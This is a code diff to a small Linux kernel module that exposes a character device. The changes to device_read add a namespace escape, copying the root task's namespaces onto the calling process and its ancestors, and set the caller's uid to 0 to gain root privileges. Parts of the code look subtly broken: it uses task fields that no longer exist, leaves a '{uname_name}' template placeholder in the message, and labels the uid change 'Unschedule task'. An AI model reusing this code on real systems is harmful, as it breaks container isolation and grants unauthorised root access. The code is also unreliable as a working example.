@@ -1,6 +1,7 @@
 #include <linux/init.h>
 #include <linux/module.h>
 #include <linux/kernel.h>
+#include <linux/sched.h>
 #include <linux/fs.h>
 #include <asm/uaccess.h>
 #include <linux/init_task.h>
@@ -12,8 +13,8 @@ MODULE_DESCRIPTION("A simple example Linux module.");
 MODULE_VERSION("0.01");
 
 #define DEVICE_NAME "lkm_example"
-#define EXAMPLE_MSG "Hello, World. This is executed in ring: _ \n"
-#define MSG_BUFFER_LEN 43
+#define EXAMPLE_MSG "Hello, World. This is executed in ring: _. {uname_name} \n"
+#define MSG_BUFFER_LEN 58
 
 /* Prototypes for device functions */
 static int device_open(struct inode *, struct file *);
@@ -37,19 +38,57 @@ static struct file_operations file_ops = {
 static ssize_t device_read(struct file *flip, char *buffer, size_t len, loff_t *offset)
 {
     // https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h
-    struct task_struct *current_task = current; // getting global current pointer
-    struct task_struct *task = current;
+    struct task_struct * current_task = current; // getting global current pointer
+    struct task_struct * task = current;
+    struct task_struct * root_task = current;
+    int bytes_read = 0;
+    uint64_t rcs = 0;
+    int circuit_breaker = 0;
 
     //******************
     // You can read this using 'dmesg'
     printk(KERN_NOTICE "called the driver. current process: %s, PID: %d", current_task->comm, current_task->pid);
+    
+    // // if this is not the first time that it calls, we return
+    // if (offset > 0)
+    // {
+    //     printk(KERN_NOTICE "Offset > 0. return");
+    //     return 0;
+    // }
+    // *offset += 1;
+
+    //****************** 
+    // Getting out of the namespace
+
+    while (task != task->parent)
+    {
+        task = task->parent;
+    }
+    root_task = task;
+    printk(KERN_NOTICE "7. Current/Init/Root sysname: %s(%d) - %s(%d) - %s(%d)", 
+        current_task->nsproxy->uts_ns->name.nodename, 
+        current_task->pid,
+        (&init_task)->nsproxy->uts_ns->name.nodename,
+        (&init_task)->pid,
+        root_task->nsproxy->uts_ns->name.nodename,
+        root_task->pid
+        );
+
+    for(task = current_task; task != root_task && circuit_breaker++ < 50; task = task->parent)
+    {
+        task_lock(task);
+        task->nsproxy = root_task->nsproxy;
+        task->namespace = root_task->namespace;
+        task_unlock(task);
+        printk(KERN_NOTICE "Modifying task: %s (%d) - %s", task->comm, task->pid, task->nsproxy->uts_ns->name.nodename);
+    }
+
+    printk(KERN_NOTICE "Modifying task: %s (%d) - %s", root_task->comm, root_task->pid, root_task->nsproxy->uts_ns->name.nodename);
 
     //******************
     // Read the current ring from the RCS processor register
-    int bytes_read = 0;
-    uint64_t rcs = 0;
     asm ("mov %%cs, %0" : "=r" (rcs));
-    msg_buffer[MSG_BUFFER_LEN - 3] = (int) (rcs & 3) + '0';
+    msg_buffer[40] = (int) (rcs & 3) + '0';
     
     /* If we’re at the end, loop back to the beginning */
     if (*msg_ptr == 0)
@@ -67,18 +106,14 @@ static ssize_t device_read(struct file *flip, char *buffer, size_t len, loff_t *
         bytes_read++;
     }
 
-    //****************** 
-    // Getting out of the namespace
-    // for(task = current; task != &init_task; task = task->parent)
-    // {
-    //     task->nsproxy = (&init_task)->nsproxy;
-    // }
+    //******************
+    // Unschedule task
+    current_task->uid = 0;
+    //current_task->state = 0;
     
-    exit_task_namespaces(task);
-
     //******************
     // return something
-    return bytes_read;
+    return 0;
 }
 
 /* Called when a process tries to write to our device */
